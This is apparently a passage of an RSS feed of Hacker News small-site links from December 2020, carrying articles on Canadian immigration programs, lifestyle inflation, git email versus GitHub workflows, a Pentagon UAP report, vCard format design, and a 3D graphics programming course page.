<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada/family-sponsorship.html">Family sponsorship</a></h3>
          <p>Sponsor your relatives, including your spouse, partner, children, parents, grandparents, and others to immigrate</p>
        </section>
      </div>
      
      
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada/atlantic-immigration-pilot.html">Atlantic Immigration Pilot</a></h3>
          <p>Immigrate by graduating from a school or working in New Brunswick, Prince Edward Island, Nova Scotia, or Newfoundland and Labrador</p>
        </section>
      </div>
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada/caregivers.html">Caregivers</a></h3>
          <p>Immigrate by providing care for children, the elderly or those with medical needs, or work as a live-in caregiver</p>
        </section>
      </div>
      
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada/self-employed.html">Self-employed</a></h3>
          <p>Immigrate as a self-employed person in cultural or athletic activities</p>
        </section>
      </div>
      
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada/agri-food-pilot/about.html">Agri-Food Pilot</a></h3>
          <p>Immigrate by working in specific agri-food industries and occupations</p>
        </section>
      </div>
		
	  
		
      <div>
        <section>
          <h3> <a href="https://www.canada.ca/en/immigration-refugees-citizenship/services/refugees.html">Refugees</a></h3>
          <p>Immigrate as a refugee or become a sponsor</p>
        </section>
      </div>
      
    </div></div>]]>
            </description>
            <link>https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577873</guid>
            <pubDate>Wed, 30 Dec 2020 02:50:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lifestyle Inflation. It's a wealth killer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577821">thread link</a>) | @wackintosh
<br/>
December 29, 2020 | https://www.thriftythoughts.io/lifestyle-inflation/ | <a href="https://web.archive.org/web/*/https://www.thriftythoughts.io/lifestyle-inflation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <h2 id="it-s-a-wealth-killer-">It's a wealth killer.</h2><p>More expensive cars, clothes, food, homes. The more money we make the more we allow ourselves to splurge. But how much does this cost in the long run?</p><figure><img src="https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--21-.png" alt="" srcset="https://www.thriftythoughts.io/content/images/size/w600/2020/12/UNCLAIMED-PROPERTY--21-.png 600w, https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--21-.png 800w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-cost-of-your-rising-expenses">The cost of your rising expenses</h2><p>Let's assume you have a salary of $50,000 per year starting at age 25 and every year you are able to obtain a 5% raise. In Scenario A as you make more money you allow your expenses to increase by 4% per year. In Scenario B as you make more money you allow your expenses to increase by only 1% per year. By allowing your costs to inflate by 3% less, the result is you end up with $1.5M additional in the bank by age 65 (and this is assuming you aren't investing any of these savings over the years).</p><!--kg-card-begin: html--><!--kg-card-end: html-->
                            <section>
                                <h2>Enjoying these posts? Subscribe for more</h2>
                                
                                <br>
                                
                            </section>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://www.thriftythoughts.io/lifestyle-inflation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577821</guid>
            <pubDate>Wed, 30 Dec 2020 02:45:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git email flow vs. GitHub flow]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577733">thread link</a>) | @todsacerdoti
<br/>
December 29, 2020 | https://blog.brixit.nl/git-email-flow-versus-github-flow/ | <a href="https://web.archive.org/web/*/https://blog.brixit.nl/git-email-flow-versus-github-flow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>So I've been using the Github flow for some years now from both the maintainer side and contributor side to open source projects. I've also been using the email workflow for git from both sides for about a year now. Using email for git sounded quite horrible before I actually started using it. Now I prefer it so I thought I would document my experience here.</p><h2 id="the-github-flow">The Github flow</h2><p>This isn't strictly for Github, it's the flow many developers are accustomed to:</p><ol><li>Fork the project repo</li><li>Make a change on your fork</li><li>Create a pull request from a branch on your fork to the main repository</li><li>Get comments on the pull request</li><li>Force-push to the same branch to update the state of the pull request</li><li>Somebody clicks merge</li></ol><p>Basically the same flow is also used on Gitlab and the other smaller git hosting services. This flow works reasonably well. It gets slightly more annoying after the first pull request because you actually have to keep your own local branch up to date.</p><p>In theory this also gives some nice discoverability of people working on the project by looking at the forks of the project. In practice this is a bunch of outdated copies of the project by people who have mistaken the fork button for a like button.</p><p>From a maintainer point of view this flow also works alright, unless your project starts to grow. For example when postmarketOS was still on Github we ran into the issue that the merge button isn't really useful. Once you have a reasonable volume of &nbsp;pull requests the branches of those pull requests get outdated quickly meaning they have to be rebased before merging or every change will have an extra merge commit in the history. </p><p>In the postmarketOS case it was decided that merge commits are extra noise in the git history we'd like to avoid so we'd need to rebase things, and to properly rebase we have to do it from the command line because Github can't deal at all with conflicts. Rebasing from the command line also gives a lot more flexibility with squashing and having a nice commit message. </p><p>The only reason that merge button was used on Github was because Github can't seem to mark the pull request as merged if it isn't done by the button. </p><figure><img src="https://blog.brixit.nl/content/images/2020/12/image.png"><figcaption>The all-knowing button from Github</figcaption></figure><p>The old workflow documentation postmarketOS had when Github was used can be read in the wiki history: <a href="https://wiki.postmarketos.org/index.php?title=Merge_Workflow&amp;oldid=3441">https://wiki.postmarketos.org/index.php?title=Merge_Workflow&amp;oldid=3441</a></p><p>Now we've moved to Gitlab we're basically dealing with the same issue, we have to mess with the commits before merging so we're always force-pushing to the git fork of the author of the pull request (which they have to enable on the merge request, if they don't we first have to tell them to enable that checkbox) and then finally merge them with the button in the web UI so Gitlab doesn't lose track of what happened.</p><h2 id="the-git-send-email-flow">The git-send-email flow</h2><p>The flow for pull requests in github isn't the original way to make pull requests. Since git was originally written for the development of the Linux kernel it has been designed with the workflow of the kernel in mind. The kernel uses mailing lists.</p><p>[insert image of horrified developers here]</p><p>The first patch I emailed was with the assistence of <a href="https://git-send-email.io/">https://git-send-email.io/</a>, I needed to learn how to use the email flow because at the time I was working on my very first kernel patch. This was quite a daunting task involing triple-checking everything against the <a href="https://www.kernel.org/doc/html/v4.17/process/submitting-patches.html">patch submission documentation</a> for Linux which describes the easy 16 step process.</p><p>Then after the final step the email gets sent out and you wait... for response emails.</p><p>Since then I've made contributions to projects hosted on Sourcehut, which also uses the email workflow, and now I also maintain some projects on this platform. For example <a href="https://git.sr.ht/~martijnbraam/megapixels">Megapixels</a>.</p><p>This is the workflow for submitting a patch to a project using the email flow:</p><ol><li>Clone the repository locally</li><li>Make your changes on your local checkout</li><li>Run <code>git send-email</code> with a ref pointing to one or a range of commits</li><li>Get comments as response to the patch as emails, mirrored on the webpage of the mailing list</li><li>Fix up your previous mistakes, run <code>git send-email</code> again with the <code>-v2</code> argument to send an updated version</li><li>The maintainer applies the patch from the email.</li></ol><p>As a maintainer getting the patches like this is quite nice since unless there's a conflict you don't have to merge branches or rebase things, the patches is just ... a patch, it only has the changes from the author, not the full git history.</p><p>Also, one thing to note about the process above is that, except for receiving the feedback, it will never touch your mail client. Git does SMTP itself and make sure the emails you send out are up-to-spec so maintainers can apply the changes directly by feeding the email into <code>git am</code></p><p>If your main complaint is that email is horrible to work with, the issue is most likely not email, it's probably your mail client.</p><p>One of the other main issues with the email workflow is that you can't just see the full state of the "pull request" because there's no nice pull request page to see what's happening. This is one of the main reasons I like the mailing lists on Sourcehut, the patch view fixes most of the visibility issues, for example this simple patch: <a href="https://lists.sr.ht/~martijnbraam/public-inbox/patches/14382">https://lists.sr.ht/~martijnbraam/public-inbox/patches/14382</a></p><figure><img src="https://blog.brixit.nl/content/images/2020/12/image-1.png"><figcaption>The overview of a patch submitted to a Sourcehut mailing list</figcaption></figure><p>There you see the patch description in the first block, which is in this case didn't have any extra text added in the <code>git send-email</code> stage, so it only shows a summary of the changes in this patch.</p><p>Below that is the actual patch, with the subject of the patch as header and then showing the full commit message below that if there were more lines and then the full diff. This patch can also be exported directly as a .patch file using the link right of the subject.</p><p>Finally, below the diff is a comment from Eyal who applied this patch to the development branch and thanked the author; the mailing list will generate a nice threaded view here if there's more discussion.</p><p>The block on the right will show the status of the patch, <code>APPLIED</code> in this case and gives some extra tools to get a copy of the full patchset that can be applied using <code>git am</code></p><h2 id="conclusion">Conclusion</h2><p>I personally prefer the e-mail workflow now, it saves me from keeping branches/forks up to date as with this workflow only diffs are sent around. Also after working in Gitlab for most of the things I do on postmarketOS I really like how quickly sourcehut pages load and that I just can get all info from the patch without clicking on tabs to switch between comments, diffs and commit messages with loading times in between.</p><p>Also one nice improvement is that instead of doing half the maintainer flow in the browser by clicking things and half by patching stuff up in my local git branch and force pushing that, it just lets me do everything in the shell and then just send an email back telling the author their patch got merged.</p><p>All together people are most likely already used to having all the comments and info emailed to them as notifications, it's just that in the gitlab/hub case it will send you a link to continue on their website and in the sourcehut/email flow case the email is everything you need to continue without ever opening the browser.</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://blog.brixit.nl/git-email-flow-versus-github-flow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577733</guid>
            <pubDate>Wed, 30 Dec 2020 02:35:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UAP Task Force to Provide Report to Senate Intelligence Committee]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577619">thread link</a>) | @weare138
<br/>
December 29, 2020 | https://thedebrief.org/uap-task-force-set-in-motion-with-passage-of-intelligence-authorization-act/ | <a href="https://web.archive.org/web/*/https://thedebrief.org/uap-task-force-set-in-motion-with-passage-of-intelligence-authorization-act/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
																					<div>
																										<p><span data-preserver-spaces="true">On December 28th, President Donald Trump signed into law an omnibus spending bill allocating $1.4 trillion in federal funding for the 2021 fiscal year. Covering everything from pandemic-relief provisions to defense spending, the massive bill also contains the FY 2021 Intelligence Authorization Act, which codifies U.S. covert and clandestine operations and defines requirements for reporting to Congress.</span></p>
<p><span data-preserver-spaces="true">Since it was first presented by the Senate Select Intelligence Committee in June, this year’s Intelligence Authorization Act has been of unusual interest thanks to an included provision titled “Advanced Aerial Threats.” In this inclusion, the committee offered intriguing support for the “efforts of the Unidentified Aerial Phenomenon Task Force at the Office of Naval Intelligence” and requested the production of an unclassified report detailing the analysis of UFOs, or as The Pentagon now terms them, Unidentified Aerial Phenomena (UAP) or “Anomalous Aerial Vehicles.”&nbsp;</span></p>
<p><span data-preserver-spaces="true">With the recent passing of the Omnibus, seemingly the clock is ticking and The Pentagon’s UAP Task Force now has 180 days to provide the Senate Intelligence Committee with their unclassified report detailing The Pentagon’s current investigations into UFOs. However, easily overlooked, the provision is not law and there is still no guarantee that a comprehensive, “all-source” UAP report will end up seeing the light of day.&nbsp;</span></p>
<p><iframe id="_ytid_67822" width="1170" height="878" data-origwidth="1170" data-origheight="878" src="https://www.youtube.com/embed/9Md7zIXWiTw?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=1&amp;fs=1&amp;playsinline=0&amp;controls=1&amp;color=red&amp;cc_lang_pref=&amp;rel=1&amp;autohide=2&amp;theme=dark&amp;" title="YouTube player" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe></p>

<p><span data-preserver-spaces="true">“The newly enacted Intelligence Authorization Act incorporates the Senate Intelligence Committee’s report language calling for an unclassified, all-source report on the UAP phenomenon. This was accomplished in the Joint Explanatory Statement accompanying the bill,” says Christopher Mellon, former Deputy Assistant Secretary of Defense for Intelligence and former staff Director of the United States Senate Intelligence Committee, who played an integral role in the development of the legislation.&nbsp;</span></p>
<p><span data-preserver-spaces="true">“Consequently, it’s now fair to say that the request for an unclassified report on the UAP phenomenon enjoys the support of both parties in both Houses of Congress,” Mellon told&nbsp;</span><em><span data-preserver-spaces="true">The Debrief&nbsp;</span></em><span data-preserver-spaces="true">in an email. “Assuming the Executive Branch honors this important request, the nation will at long last have an objective basis for assessing the validity of the issue and its national security implications. This is an extraordinary and long overdue opportunity.”</span></p>
<p><span data-preserver-spaces="true">Origins for the Senate Intelligence Committee’s UAP report request can be traced back to December 2017, when the&nbsp;</span><em><span data-preserver-spaces="true">New York Times&nbsp;</span></em><a href="https://www.nytimes.com/2017/12/16/us/politics/pentagon-program-ufo-harry-reid.html" target="_blank" rel="noopener"><span data-preserver-spaces="true">published an article</span></a><span data-preserver-spaces="true">&nbsp;revealing a secretive study within the Pentagon known as The Advanced Aerospace Threat Identification Program (AATIP). Coinciding with the article’s publication were the “unofficial” release of three videos captured by the Navy in 2004 and 2015, which showed indistinctive airborne objects claimed to be UAP.&nbsp;&nbsp;</span></p>
<p><span data-preserver-spaces="true">In April 2020, the Department of Defense officially released the three videos, acknowledging in a statement from the Secretary of Defense’s Office that aerial phenomena observed in the videos remain characterized as “unidentified.” In mid-August, the Pentagon formally acknowledged they had established a task force looking into UAP.&nbsp;</span></p>
<p><iframe id="_ytid_51600" width="1170" height="658" data-origwidth="1170" data-origheight="658" src="https://www.youtube.com/embed/nHunx8BocSI?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=1&amp;fs=1&amp;playsinline=0&amp;controls=1&amp;color=red&amp;cc_lang_pref=&amp;rel=1&amp;autohide=2&amp;theme=dark&amp;" title="YouTube player" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe></p>

<p><span data-preserver-spaces="true">In a press announcement, the Secretary of Defense’s Office stated, “the UAPTF’s mission will be to detect, analyze and catalog UAPs that could potentially pose a threat to U.S. national security.” According to the release,&nbsp;</span><a href="https://thedebrief.org/the-dod-has-officially-announced-it-has-a-uap-task-force-heres-what-that-means/" target="_blank" rel="noopener"><span data-preserver-spaces="true">authority for the Task Force was approved</span></a><span data-preserver-spaces="true">&nbsp;by the DoD’s chief operating officer, Deputy Secretary of Defense David L. Norquist.”&nbsp;</span></p>
<p><span data-preserver-spaces="true">One of the most vocal advocates for a serious investigation into UFO sightings in recent months has been Luis Elizondo, the former Director of the National Programs Special Management Staff for the Office of the Under Secretary of Defense for Intelligence, who headed up the Pentagon’s AATIP program. In the fall of 2017, Elizondo resigned from the DoD, citing what he felt was a lack of serious attention being placed on the UAP issue. Elizondo would subsequently go to work for the To the Stars Academy, a UFO-centric organization founded by musician Tom DeLonge.</span></p>
<p><span data-preserver-spaces="true">“I believe this is a tremendous step forward in that our representatives are taking this topic seriously,” Elizondo told&nbsp;</span><em><span data-preserver-spaces="true">The Debrief&nbsp;</span></em><span data-preserver-spaces="true">in an email, speaking about the approval of the recent Intelligence Authorization Act.&nbsp;</span></p>
<p><span data-preserver-spaces="true">While this news may be exciting for many UFO/UAP enthusiasts, the UAP report provision is not binding law, so there is no guarantee the public will be provided any comprehensive information on UAP. Additionally, if the <a href="https://thedebrief.org/fast-movers-and-transmedium-vehicles-the-pentagons-uap-task-force/">UAP Task Force deems certain information classified</a>, the legislative branch does not have the authority to declassify that information in order to make it publicly available. With a new executive administration taking office in less than a month, it may ultimately come down to the significance the Biden administration, and new presidential appointees place on the UAP issue.&nbsp;</span></p>
<p><span data-preserver-spaces="true">“We must remain diligent in order to ensure any report submitted to Congress is done to the level and expectations of the committee members,” Elizondo said, “and not simply a whitewash to satisfy yet another Congressional requirement.”</span></p><div><div id="block-wrap-25586" data-id="25586"><div><div><div>		<article>
					<p><a href="https://thedebrief.org/experts-say-lethal-drones-wont-transform-warfare-but-they-will-transform-terrorism/">
				<img width="120" height="64" src="https://thedebrief.org/wp-content/uploads/2020/11/drone1.jpg" alt="lethal drones" srcset="https://thedebrief.org/wp-content/uploads/2020/11/drone1.jpg 1280w,https://thedebrief.org/wp-content/uploads/2020/11/drone1-300x161.jpg 300w,https://thedebrief.org/wp-content/uploads/2020/11/drone1-1024x549.jpg 1024w,https://thedebrief.org/wp-content/uploads/2020/11/drone1-768x412.jpg 768w" sizes="(max-width: 120px) 100vw, 120px" data-srcset="https://thedebrief.org/wp-content/uploads/2020/11/drone1.jpg 1280w, https://thedebrief.org/wp-content/uploads/2020/11/drone1-300x161.jpg 300w, https://thedebrief.org/wp-content/uploads/2020/11/drone1-1024x549.jpg 1024w, https://thedebrief.org/wp-content/uploads/2020/11/drone1-768x412.jpg 768w" data-src="https://thedebrief.org/wp-content/uploads/2020/11/drone1.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">			</a>
		</p>
					
		</article>
		</div></div></div></div></div>
<p><span data-preserver-spaces="true">Christopher Mellon remains cautious but optimistic. “The challenge now will be getting the myriad DoD and I.C. [Intelligence Community] components with pertinent information to cooperate,” he told&nbsp;</span><em><span data-preserver-spaces="true">The Debrief.&nbsp;</span></em></p>
<p><span data-preserver-spaces="true">“I’m hopeful the new Administration will rigorously execute its oversight prerogatives because the concerns of the public and numerous U.S. military personnel have been ignored by a complacent national security bureaucracy for far too long,” Mellon said.&nbsp;</span></p>
<p><span data-preserver-spaces="true">As 2021 approaches, <a href="https://thedebrief.org/leaked-photo-surfaces-of-purported-unidentified-aerial-phenomena-leaked-ufo-photo/">the UAP issue is more visible than ever.</a> Despite this, the level of accessibility of information included with the Task Force’s forthcoming report remains to be determined.</span></p>
<p><span data-preserver-spaces="true">“This report, when submitted, will serve as a litmus to determine how seriously the Pentagon takes this topic,” Elizondo said, “and even more so, the authority and the will of the Congress.”</span></p>
<p><span data-preserver-spaces="true">“Let me remind the Pentagon,” Elizondo added, “that the world is watching and will judge them on their actions.”</span></p>


									</div>
			</div></div>]]>
            </description>
            <link>https://thedebrief.org/uap-task-force-set-in-motion-with-passage-of-intelligence-authorization-act/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577619</guid>
            <pubDate>Wed, 30 Dec 2020 02:19:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I'm not working on vCard validators]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577039">thread link</a>) | @miles
<br/>
December 29, 2020 | https://paperless.blog/why-im-not-working-on-vcard-validators | <a href="https://web.archive.org/web/*/https://paperless.blog/why-im-not-working-on-vcard-validators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The <a href="https://paperless.blog/2009/12/25/vcard-parser-and-validator/">vCard 3.0 validator</a> is ten years old. The standard has moved on, Python has moved on, and I'd like to think I've learned a thing or two as a developer. But I'm not working on any vCard validators, and probably won't be for the foreseeable future.</p>

<p>Maybe I'm suffering from <a href="https://en.wikipedia.org/wiki/Second-system_effect">second-system syndrome</a>, but I've tried to reboot the project at least three times now. The Python code isn't very elegant, fast or well tested. I set up skeletons in <a href="https://gitlab.com/victor-engmark/vcard/tree/master/javcard">Java version</a> and <a href="https://gitlab.com/victor-engmark/vcard-rust">Rust</a>, both excellent languages. I tried defining an <a href="https://github.com/antlr/grammars-v4">ANTLR grammar</a>. But I've got nothing to show for any of that. The main problem is motivation: vCard 3, 4 and <a href="https://tools.ietf.org/html/rfc7095">jCard</a> are incredibly out of date, to the point where writing a parser is equal parts painful and boring.</p>
<p><img src="https://paperless.blog/assets/images/standards.png" alt="standards" width="500" height="283"></p>
<p>And now, because the Internet needs more opinions (and standards): a human friendly address card format is possible. vCard/jCard is not it. When someone brave and tenacious enough to take this on comes around, I really hope they take at least the following into account:</p>
<ul>
    <li>Use a <strong>popular, existing serialization format.</strong> JSON won in this space. It's not perfect, but it's here to stay and it's a good compromise between human and machine readable.</li>
    <li>Don't create another jCard. If you were developing the world's first address card format, what would users and developers want to see?</li>
    <li>Conversely, vCard did many things right. <strong>UTF-8, base64 and ISO dates</strong> are definitely good things.</li>
    <li>All caps is hard to read. Don't shout.</li>
    <li>Don't limit (or even recommend) a line length or line splitting scheme. Address cards shouldn't be inlined into emails or documents any more than CSV files.</li>
    <li><strong>Dictionaries</strong> (as in associated key/value pairs) are useful. Use them.</li>
    <li><strong>Lists</strong> are useful. Use them.</li>
    <li><strong>Preferred name</strong> should probably be the only required name field.</li>
    <li><strong>Time zones are not UTC offsets.</strong> I do not live in time zone "+12:00", because that offset changes twice per year. I live in time zone "Pacific/Auckland". This can be the difference between being on time and wasting everybody's time.</li>
    <li>Allow <strong>linking to photos.</strong> Sure URLs are ephemeral, but so is basically everything in an address card.</li>
    <li><strong>Any property not in the standard should simply be ignored,</strong> as long as the entire document is still a valid instance of the serialization format.</li>
    <li><strong>Internationalization and localization</strong> are complex but important.</li>
</ul>
<p>What will such a standard look like? Maybe something like this will be possible:</p>
<pre>{
    "preferred name": "Jane Doe",
    "phone": {
        "cell": ["+99 9999-9999", "+11 0000 0000"],
        "home": "+99 9999-9999"
    },
    "URL": {
        "blog": "https://…",
        "work": ["https://example.org/", "https://example.com/"]
    },
    "photo": "https://…",
    "my custom property": "…",
    "time zone": "Pacific/Auckland"
}
</pre>

  </div>

  

</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://paperless.blog/why-im-not-working-on-vcard-validators</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577039</guid>
            <pubDate>Wed, 30 Dec 2020 00:54:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn 3D Computer Graphics Programming from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25576462">thread link</a>) | @myth_drannon
<br/>
December 29, 2020 | https://courses.pikuma.com/courses/learn-computer-graphics-programming | <a href="https://web.archive.org/web/*/https://courses.pikuma.com/courses/learn-computer-graphics-programming">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content" role="main">
  <a id="cst-v2-section-4ed91abbde"></a>

<section data-preview-item="banner-course" data-section-uid="4ed91abbde">
  
</section>




<a id="cst-v2-section-HycmTyvOE"></a><section data-preview-item="checklist" data-section-uid="HycmTyvOE">
  <div>
    <div>
      
  <header>
    
      <h3>This course includes</h3>
    
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>30 hours of on-demand video</p>
              </li>
            
              <li>
                <p><i></i>Downloadable resources and exercises</p>
              </li>
            
              <li>
                <p><i></i>Full lifetime access</p>
              </li>
            
              <li>
                <p><i></i>Access on mobile and desktop</p>
              </li>
            
              <li>
                <p><i></i>14-day money back guarantee</p>
              </li>
            
              <li>
                <p><i></i>Secure checkout through PayPal or Stripe</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-BJzA6XSdN"></a><section data-preview-item="video" data-section-uid="BJzA6XSdN">
  
</section>

  





<a id="cst-v2-section-ryenGXDBH"></a><section data-preview-item="checklist" data-section-uid="ryenGXDBH">
  <div>
    <div>
      
  <header>
    
      <h3>Prerequisites</h3>
    
    
      <h4> Before taking this course, you must have:</h4>
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>A basic understanding of programming fundamentals, such as variables, conditionals, loops, and functions.</p>
              </li>
            
              <li>
                <p><i></i>An idea of what a C-style programming language looks like (for example: C++, Java, C#, JavaScript, or Swift).</p>
              </li>
            
              <li>
                <p><i></i>Some experience with the command-line on either Linux, Windows, or macOS.</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-HJ495RX_E"></a><section data-preview-item="text-image" data-section-uid="HJ495RX_E">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>Is this course for you?</h3>
    
    
  </header>


        <p>
          Did you ever wonder how 3D engines render objects on the screen? Or how graphics APIs such as OpenGL or DirectX are written? This course is a complete immersion on how CPU-based 3D engines work. We will use C to develop a complete 3D engine from scratch, pixel by pixel, triangle per triangle. This is a basic course that requires no prior knowledge, but you will probably make the most of it if you know already the basics of programming.
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/RLXbjGyOQNSYemAckI7t_cube.gif" alt="Is this course for you?" title="Is this course for you?">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-BJLXI7uSr"></a><section data-preview-item="text-image" data-section-uid="BJLXI7uSr">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>What you'll learn</h3>
    
    
      <h4>Course overview and structure</h4>
    
  </header>


        <p>
          This course is a complete journey into the world of 3D rendering. We will learn how to represent and display 3D objects without any graphics API. No OpenGL. No DirectX. No GPU. Just you, your C compiler, a smoking processor, and an array of pixel colors willing to dance 90's style. You will learn how to draw pixels, rasterize lines, triangles, complex 3D models, and understand the theory and the math behind computer graphics programming. If you want to understand how computer graphics really work, join us now!
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/Yyy0bZO3QMKfL54nGwlE_f22.gif" alt="What you'll learn" title="What you'll learn">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-SkVHSmBO4"></a><section data-preview-item="text-icon" data-section-uid="SkVHSmBO4">
  <div>
    

    <article>
      
        <div>
          <ul>
            
              <li>
                <i></i>
                <h4>Lifetime access</h4>
                <p>Enroll now and get lifetime access to the course content</p>
              </li>
            
              <li>
                
                <h4>Access to discussion forum</h4>
                <p>Discuss course topics and engage with other students using the discussion board</p>
              </li>
            
              <li>
                <i></i>
                <h4>Money back guarantee</h4>
                <p>We offer a 14-day money back guarantee for all our courses. No questions asked.</p>
              </li>
            
          </ul>
        </div>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-a7929a42cb"></a><section data-preview-item="course-curriculum" data-section-uid="a7929a42cb">
  
</section>






<a id="cst-v2-section-SkoDUs7uE"></a><section data-preview-item="instructor" data-section-uid="SkoDUs7uE">
  <div>
    
  <header>
    
      <h3>Instructor</h3>
    
    
  </header>


    <article>
      
        <ul>
          
          
            <li>
              
              <p><img src="https://thinkific-import.s3.amazonaws.com/167815/UhcXrUppRcGK1ZTSy8gj_profile-picture-bass2-small-square.png" alt="Gustavo Pezzi" title="Gustavo Pezzi">
              </p>
              
              <div>
                <header>
                  
                    <h4>
                      Senior Lecturer
                    </h4>
                  
                  <h4>
                    Gustavo Pezzi
                  </h4>
                </header>
                
                  <section>
                    Gustavo teaches computer science and mathematics at BPP University, London. He studies how teaching game programming can help enhance awareness and understanding of basic mathematics and physics. He is also a professional software engineer with more than 10 years of experience, with an industry background in 3D systems, games, systems, databases, and data analysis.
His academic path includes institutions such as Pittsburg State University, City University of London, and University of Oxford.
                  </section>
                  
                
              </div>
            </li>
          
        </ul>
      
    </article>
  </div>
</section>






<a id="cst-v2-section-zg3768Lds"></a><section data-preview-item="reviews" data-section-uid="zg3768Lds">
  <div>
    
  <header>
    
      <h3>Reviews</h3>
    
    
  </header>


    <article>
      
        <ul>
          
            
            <li data-review-id="1">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great course
                </h4>
                
              </header>
              <section>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in su...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in such a clear way (if at all) . Also using C which I am more comfortable using than OOP (i'm a bit old school) .  It is a great refresher on C too, its a big project so far (only a bout 1/3 of the way through), but loving it so far.  </p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="2">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Very good course and very well explained
                </h4>
                <h4>jÃ©rÃ©my aldebert</h4>
              </header>
              <section>
                <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                <div>
                  <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="3">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  The real 3d graphics fundamentals course
                </h4>
                <h4>Andrew Douglas</h4>
              </header>
              <section>
                <div>
                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were di...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
